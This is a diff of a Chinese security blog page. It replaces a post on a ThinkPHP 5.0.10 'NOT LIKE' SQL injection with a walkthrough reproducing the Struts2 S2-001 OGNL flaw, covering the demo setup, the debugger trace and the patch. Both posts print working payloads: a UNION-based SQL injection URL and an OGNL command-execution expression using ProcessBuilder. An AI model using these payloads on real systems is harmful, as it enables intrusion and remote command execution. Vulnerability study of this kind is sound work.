@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="代码审计,thinkphp,">
+  <meta name="keywords" content="代码审计,java,struct2,">
 
 
 
@@ -83,24 +83,45 @@
 
 
 
-<meta name="description" content="0x00 前言&amp;amp;&amp;amp;影响版本在tp5 sql注入漏洞中，这个漏洞算是危害比较大的了，因为其他的sql注入一般不支持子查询。而这个漏洞只出现在5.0.10版本中，也算是将危害降到最低了。12漏洞影响版本thinkphp 5.0.10 0x01 漏洞成因那么为什么这个注入支持子查询呢。我们知道tp5重写了数据库操作类方法。而在5.0.10版本中，增加了NOT LIKE操作。可以看到进入这">
-<meta name="keywords" content="代码审计,thinkphp">
+<meta name="description" content="0x00 前言入门JAVA代码审计的第一篇文章，还是决定以漏洞之王struct2下手，本篇即以学习为目的，复现分析S2-001,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。 0x01 环境搭建工具选择使用了IDEA，下面记录一下如何使用IDEA创建第一个struct2项目。IDEA需下载Ultimate版本,Community版本无法创建Java EE工程。首先New Project创建">
+<meta name="keywords" content="代码审计,java,struct2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="thinkphp 5.0.10 sql注入漏洞 支持子查询">
-<meta property="og:url" content="https://zhengbao.wang/thinkphp-5-0-10-sql注入漏洞-支持子查询/index.html">
+<meta property="og:title" content="java代码审计入门之s2-001复现分析">
+<meta property="og:url" content="https://zhengbao.wang/java代码审计入门之s2-001复现分析/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blog">
-<meta property="og:description" content="0x00 前言&amp;amp;&amp;amp;影响版本在tp5 sql注入漏洞中，这个漏洞算是危害比较大的了，因为其他的sql注入一般不支持子查询。而这个漏洞只出现在5.0.10版本中，也算是将危害降到最低了。12漏洞影响版本thinkphp 5.0.10 0x01 漏洞成因那么为什么这个注入支持子查询呢。我们知道tp5重写了数据库操作类方法。而在5.0.10版本中，增加了NOT LIKE操作。可以看到进入这">
+<meta property="og:description" content="0x00 前言入门JAVA代码审计的第一篇文章，还是决定以漏洞之王struct2下手，本篇即以学习为目的，复现分析S2-001,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。 0x01 环境搭建工具选择使用了IDEA，下面记录一下如何使用IDEA创建第一个struct2项目。IDEA需下载Ultimate版本,Community版本无法创建Java EE工程。首先New Project创建">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/01/24/5c49cc27562ef.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/24/5c49cd94b0588.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/24/5c49ce9230ad5.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/24/5c49d13405cd9.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/24/5c49d16403ffd.png">
-<meta property="og:updated_time" content="2019-03-07T03:38:16.505Z">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb199d238fb8.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb19a73c7b2b.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1a68f2cf2d.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb19dbb0a748.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb19e06e4c46.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1a74e548e5.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb19efb3dc76.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1a09665c32.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1a0d149c67.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1a7b081bbd.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1a96ed125a.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/12/AqalV0.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb147fc19bfc.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/12/5cb00c397a2ee.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb157f27980b.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1583bbf7c7.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb159a769188.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb15a1922f79.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb15dcf9e97c.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb15e428937d.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb15f12d6784.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb15fe7d316b.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb160217abad.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb161298df9b.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb161c75292f.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/13/5cb1b1bce7cb1.png">
+<meta property="og:updated_time" content="2019-04-13T09:57:46.975Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="thinkphp 5.0.10 sql注入漏洞 支持子查询">
-<meta name="twitter:description" content="0x00 前言&amp;amp;&amp;amp;影响版本在tp5 sql注入漏洞中，这个漏洞算是危害比较大的了，因为其他的sql注入一般不支持子查询。而这个漏洞只出现在5.0.10版本中，也算是将危害降到最低了。12漏洞影响版本thinkphp 5.0.10 0x01 漏洞成因那么为什么这个注入支持子查询呢。我们知道tp5重写了数据库操作类方法。而在5.0.10版本中，增加了NOT LIKE操作。可以看到进入这">
-<meta name="twitter:image" content="https://i.loli.net/2019/01/24/5c49cc27562ef.png">
+<meta name="twitter:title" content="java代码审计入门之s2-001复现分析">
+<meta name="twitter:description" content="0x00 前言入门JAVA代码审计的第一篇文章，还是决定以漏洞之王struct2下手，本篇即以学习为目的，复现分析S2-001,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。 0x01 环境搭建工具选择使用了IDEA，下面记录一下如何使用IDEA创建第一个struct2项目。IDEA需下载Ultimate版本,Community版本无法创建Java EE工程。首先New Project创建">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/13/5cb199d238fb8.png">
 
 
 
@@ -130,13 +151,13 @@
 
 
 
-  <link rel="canonical" href="https://zhengbao.wang/thinkphp-5-0-10-sql注入漏洞-支持子查询/">
+  <link rel="canonical" href="https://zhengbao.wang/java代码审计入门之s2-001复现分析/">
 
 
 
 
 
-  <title>thinkphp 5.0.10 sql注入漏洞 支持子查询 | Boogle's Blog</title>
+  <title>java代码审计入门之s2-001复现分析 | Boogle's Blog</title>
   
 
 
@@ -308,7 +329,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/thinkphp-5-0-10-sql注入漏洞-支持子查询/">
+    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/java代码审计入门之s2-001复现分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="boogle">
@@ -325,7 +346,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">thinkphp 5.0.10 sql注入漏洞 支持子查询</h1>
+          <h1 class="post-title" itemprop="name headline">java代码审计入门之s2-001复现分析</h1>
         
 
         <div class="post-meta">
@@ -337,8 +358,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-25T23:58:23+08:00">
-                2019-01-25
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-13T17:56:47+08:00">
+                2019-04-13
               </time>
             
 
@@ -378,8 +399,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/thinkphp-5-0-10-sql注入漏洞-支持子查询/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/thinkphp-5-0-10-sql注入漏洞-支持子查询/" itemprop="commentCount"></span>
+                <a href="/java代码审计入门之s2-001复现分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/java代码审计入门之s2-001复现分析/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -387,7 +408,7 @@
 
           
           
-             <span id="/thinkphp-5-0-10-sql注入漏洞-支持子查询/" class="leancloud_visitors" data-flag-title="thinkphp 5.0.10 sql注入漏洞 支持子查询">
+             <span id="/java代码审计入门之s2-001复现分析/" class="leancloud_visitors" data-flag-title="java代码审计入门之s2-001复现分析">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -412,7 +433,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  441 字
+                  1.5k 字
                 </span>
               
 
@@ -428,7 +449,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3 分钟
+                  18 分钟
                 </span>
               
             </div>
@@ -449,13 +470,21 @@
       
 
       
-        <h3 id="0x00-前言-amp-amp-影响版本"><a href="#0x00-前言-amp-amp-影响版本" class="headerlink" title="0x00 前言&amp;&amp;影响版本"></a>0x00 前言&amp;&amp;影响版本</h3><p>在tp5 sql注入漏洞中，这个漏洞算是危害比较大的了，因为其他的sql注入一般不支持子查询。而这个漏洞只出现在5.0.10版本中，也算是将危害降到最低了。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本</span><br><span class="line"><span class="selector-tag">thinkphp</span> 5<span class="selector-class">.0</span><span class="selector-class">.10</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="0x01-漏洞成因"><a href="#0x01-漏洞成因" class="headerlink" title="0x01 漏洞成因"></a>0x01 漏洞成因</h3><p>那么为什么这个注入支持子查询呢。我们知道tp5重写了数据库操作类方法。而在5.0.10版本中，增加了<strong>NOT LIKE</strong>操作。<br><img src="https://i.loli.net/2019/01/24/5c49cc27562ef.png" alt><br>可以看到进入这个分支后没有任何过滤，直接拼接到了<strong>whereStr</strong>变量，作为sql语句的一部分返回。<br>而其他分支其实也没有做任何过滤，为什么增加了<strong>NOT LIKE</strong>后出现了漏洞呢？<br>那是因为tp5的助手函数<strong>input()</strong>在输入数据时，进行了过滤操作。<br><img src="https://i.loli.net/2019/01/24/5c49cd94b0588.png" alt><br>这里主要说<strong>filterExp()</strong><br><img src="https://i.loli.net/2019/01/24/5c49ce9230ad5.png" alt><br>这里进行关键字匹配，当匹配到时在关键字后面添加空格。这样我们就不能控制上面进入相应的分支了，在函数中可以可以包括了很多能控制分支流程的关键字，却唯独没有<strong>NOT LIKE</strong>。那么说到这里我们也就明白了，漏洞的成因是在5.0.10版本数据库操作类方法中增加了<strong>NOT LIKE</strong>但是filterExp函数没有及时更正更新导致了sql注入。</p>
-<h3 id="0x02-测试demo"><a href="#0x02-测试demo" class="headerlink" title="0x02 测试demo"></a>0x02 测试demo</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line"></span><br><span class="line">          $data = input(<span class="string">'get.name/a'</span>);</span><br><span class="line">          $sql_data = db(<span class="string">'think_user'</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$data))-&gt;select();</span><br><span class="line">          var_dump($sql_data);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://127.0.0.1/thinkphp<span class="emphasis">_5.0.10_</span>full/public/index.php/Index/index/index?name[<span class="string">0</span>]=not%20like&amp;name[<span class="string">1</span>][<span class="symbol">0</span>]=123&amp;name[<span class="string">1</span>][<span class="symbol">1</span>]=6666&amp;name[2]=) and 1=2 union select 1,user(),3,4,id from think_user -- +</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/01/24/5c49d13405cd9.png" alt></p>
-<h3 id="0x03-修补方法"><a href="#0x03-修补方法" class="headerlink" title="0x03 修补方法"></a>0x03 修补方法</h3><p>在filterExp()方法中增加<strong>NOT LIKE</strong></p>
-<p><img src="https://i.loli.net/2019/01/24/5c49d16403ffd.png" alt></p>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>入门JAVA代码审计的第一篇文章，还是决定以漏洞之王<code>struct2</code>下手，本篇即以学习为目的，复现分析<code>S2-001</code>,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。</p>
+<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>工具选择使用了<code>IDEA</code>，下面记录一下如何使用<code>IDEA</code>创建第一个struct2项目。<br>IDEA需下载<code>Ultimate</code>版本,<code>Community</code>版本无法创建<code>Java EE</code>工程。<br>首先<code>New Project</code>创建<code>Struts2</code>项目，<code>Libraries</code>选择<code>Set up library later</code><br><img src="https://i.loli.net/2019/04/13/5cb199d238fb8.png" alt><br>下一步之后填写项目名称即可创建起一个struct2 project<br><img src="https://i.loli.net/2019/04/13/5cb19a73c7b2b.png" alt><br>下载<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">struct-2.0.1-all</a></p>
+<p>在项目目录<code>WEB-INF</code>下新建<code>lib</code>文件夹，将所需要的jar包从下载目录中导入到<code>lib</code>文件夹下</p>
+<p>将全部jar包选中，右键<code>Add as Library</code><br><img src="https://i.loli.net/2019/04/13/5cb1a68f2cf2d.png" alt><br>填写一个Library Name<br><img src="https://i.loli.net/2019/04/13/5cb19dbb0a748.png" alt><br>然后<code>File-&gt;Project Structure</code><br><img src="https://i.loli.net/2019/04/13/5cb19e06e4c46.png" alt><br>然后在<code>Modules</code>下选中<code>struct2-001</code><br><img src="https://i.loli.net/2019/04/13/5cb1a74e548e5.png" alt><br>之后再在<code>Artifacts</code>如下图将<code>struct2-001</code>put into output root，完成后点击OK.<br><img src="https://i.loli.net/2019/04/13/5cb19efb3dc76.png" alt><br>之后按下图创建<code>Tomcat server</code><br><img src="https://i.loli.net/2019/04/13/5cb1a09665c32.png" alt><br>在配置页面点击<code>Fix</code>,其他默认即可。<br><img src="https://i.loli.net/2019/04/13/5cb1a0d149c67.png" alt><br>至此即可看到一个struct2项目启动成功。<br><img src="https://i.loli.net/2019/04/13/5cb1a7b081bbd.png" alt><br>因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。<br>在<code>WEB</code>目录下修改<code>index.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sign On<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">action</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:submit</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后新建<code>welcome.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">s:property</span> <span class="attr">value</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">s:property</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>在<code>src</code>下新建<code>com.demo.action</code>package<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="title">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String getUsername() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String getPassword() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> void setUsername(String username) &#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> void setPassword(String password) &#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String execute() &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>修改<code>struct.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"s2"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"Login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.Login"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>之后即可运行程序出现登陆Demo<br><img src="https://i.loli.net/2019/04/13/5cb1a96ed125a.png" alt></p>
+<h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>在分析之前还是看一下十多年前官方的描述<br><img src="https://s2.ax1x.com/2019/04/12/AqalV0.png" alt="AqalV0.png"><br>看到问题是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用<br>OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。<br>第一次分析JAVA代码，还是觉得无从下断分析，但是既然是OGNL表达式导致的问题，那么表达式必然会经过OGNL解析并返回结果，前辈们给出的分析思路便是在OGNL表达式原生API <code>getValue</code>处下断点，该方法用于解析OGNL表达式并返回表达式的值。<br><img src="https://i.loli.net/2019/04/13/5cb147fc19bfc.png" alt><br>下断后便可发送payload<code>%{1+1}</code>，直到在断点处出现我们的payload,此时在调用栈中即可看到漏洞发生的整个过程。<br><img src="https://i.loli.net/2019/04/12/5cb00c397a2ee.png" alt><br>然后便可以根据调用栈开始分析过程。<br>首先我们的payload是从<code>index.jsp</code>输入的，这里需要了解的是jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，比如这里<code>index.jsp</code>被转化为<code>index_jsp.java</code>。<br><img src="https://i.loli.net/2019/04/13/5cb157f27980b.png" alt><br>之后struct便会调用<code>ComponentTagSupport</code>类中<code>doStartTag</code> <code>doEndTag</code>方法对<code>index_JSP.hava</code>中的struct标签进行处理。<br><img src="https://i.loli.net/2019/04/13/5cb1583bbf7c7.png" alt><br>上图可以看出，调用<code>doEndTag</code>方法对标签时会调用<code>this.component.end()</code>方法。<br>跟进之后在<code>UIBean</code>类中<code>end</code>方法中会继续调用同类下的<code>evaluateParams</code><br><img src="https://i.loli.net/2019/04/13/5cb159a769188.png" alt><br>跟进<code>evaluateParams</code>，该方法会对标签属性取得name之后判断是否开启<code>altSyntax</code>功能，开启则会用<code>%{}</code>将标签属性值名称包裹，用于使用OGNL表达式对其处理。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">altSyntax</span> 功能是 <span class="keyword">Struts </span><span class="number">2</span> 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行。该功能在<span class="keyword">struct2核心配置文件struts.properties中默认开启。</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/04/13/5cb15a1922f79.png" alt><br>然后username经过上面处理之后，进入到该类下的<code>getValue</code>方法查询表达式的值，继续跟进。<br><img src="https://i.loli.net/2019/04/13/5cb15dcf9e97c.png" alt><br>在该方法中调用<code>TextParseUtil.translateVariables</code>。<br><img src="https://i.loli.net/2019/04/13/5cb15e428937d.png" alt><br>之后调用了该类下的同名方法<code>translateVariables</code>，对OGNL表达式进行了递归处理，从而使得我们的payload可以在递归处理时被OGNL表达式执行。<br>继续查看该方法，便可以看到使用了<code>while(true)</code>对表达式进行了递归处理。<br><img src="https://i.loli.net/2019/04/13/5cb15f12d6784.png" alt><br>之后便对表达式去掉<code>%{}</code>调用<code>stack.findValue</code>即<code>OgnlValueStack</code>类下的<code>findValue</code>，并最终调用了Ognl的<code>getValue</code>方法对表达式进行取值<br><img src="https://i.loli.net/2019/04/13/5cb15fe7d316b.png" alt><br>在<code>getValue</code>中可以看到取到了我们的payload<br><img src="https://i.loli.net/2019/04/13/5cb160217abad.png" alt><br>之后取得的值复制给<code>o</code>并最终复制给<code>expression</code>，继续在while循环中被处理。<br><img src="https://i.loli.net/2019/04/13/5cb161298df9b.png" alt><br>最终在OGNL表达式中被处理，获得计算结果<code>2</code>。<br><img src="https://i.loli.net/2019/04/13/5cb161c75292f.png" alt></p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>POC<br><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="symbol">#a</span>=(new java.lang.<span class="type">ProcessBuilder</span>(new java.lang.<span class="type">String</span>[]&#123;<span class="comment">"whoami"</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),<span class="symbol">#b</span>=<span class="symbol">#a</span>.getInputStream(),<span class="symbol">#c</span>=new java.io.<span class="type">InputStreamReader</span>(<span class="symbol">#b</span>),<span class="symbol">#d</span>=new java.io.<span class="type">BufferedReader</span>(<span class="symbol">#c</span>),<span class="symbol">#e</span>=new char[<span class="number">50000</span>],<span class="symbol">#d</span>.read(<span class="symbol">#e</span>),<span class="symbol">#f</span>=<span class="symbol">#context</span>.get(<span class="comment">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>),<span class="symbol">#f</span>.getWriter().println(new java.lang.<span class="type">String</span>(<span class="symbol">#e</span>)),<span class="symbol">#f</span>.getWriter().flush(),<span class="symbol">#f</span>.getWriter().close()&#125;</span><br></pre></td></tr></table></figure></p>
+<p>修改<code>new java.lang.String[]{&quot;whoami&quot;}</code>即可执行任意命令</p>
+<p>如需参数可这样利用<code>new java.lang.String[]{&quot;net&quot;,&quot;user&quot;}</code></p>
+<h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p>在<code>XWork2.0.4</code>增加了loopCount判断以取消对OGNL的递归解析<br><img src="https://i.loli.net/2019/04/13/5cb1b1bce7cb1.png" alt></p>
